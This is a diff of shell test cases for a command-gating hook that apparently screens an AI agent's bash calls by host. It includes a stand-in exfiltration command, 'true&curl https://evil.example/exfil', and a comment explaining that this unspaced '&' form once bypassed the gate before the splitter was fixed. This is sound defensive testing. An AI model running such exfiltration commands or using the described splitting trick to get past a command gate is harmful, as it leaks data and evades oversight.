@@ -75,6 +75,27 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "allow"'
 }
 
+@test "AC-2 (Copilot R3): background '&' without spaces is split into segments" {
+  # `true&curl ...` (no space before `&`) was previously tokenized as
+  # one segment with CLI `true&curl` (unknown) → fell through to ALLOW
+  # → bypassed the gate. Splitter now consumes `&` regardless of
+  # surrounding whitespace (after `&&` is handled).
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'true&curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Copilot R3): && (logical AND) is not mis-split into single &s" {
+  # Pin that `&&` is still handled as the 2-char operator first, so a
+  # chained `cd /tmp && curl ...` is split into two segments rather
+  # than four (`cd /tmp`, ``, `curl ...`, ``).
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'cd /tmp && curl https://api.github.com/repos/foo'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 # ---------------------------------------------------------------------------
 # curl + wget — extract host from URL
 # ---------------------------------------------------------------------------
@@ -376,15 +397,18 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "allow"'
 }
 
-@test "AC-2 (Copilot R2): scp ignores Windows drive paths (C:/foo) — NOT a host" {
-  # `C:` is a single-letter Windows drive, NOT a hostname. The
-  # heuristic in _host_from_hostpath rules it out (requires >=4 char
-  # host OR dotted name). The command should pass through to the
-  # generic `*) allow` branch.
+@test "AC-2 (Copilot R3): scp with Windows-drive path → fail-CLOSED block (no host)" {
+  # `C:/Users/foo` is a Windows drive path, NOT `host:path`. The
+  # _host_from_hostpath heuristic rejects single-letter `X:[\\/]`
+  # explicitly. Since the scp command has NO extractable host on the
+  # CLI, the hook falls into the "scp without an extractable host"
+  # fail-CLOSED branch — pinning that behavior so a future refactor
+  # accidentally treating `C` as a host fails this test.
   echo 'walter-vm.tail.example' > "$ALLOWLIST"
   run _call_hook_bash 'scp ./file.txt C:/Users/foo'
   [ "$status" -eq 0 ]
-  echo "$output" | jq -e '.decision == "block"' || echo "$output" | jq -e '.decision == "allow"'
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -qE 'extractable host|scp'
 }
 
 # ---------------------------------------------------------------------------
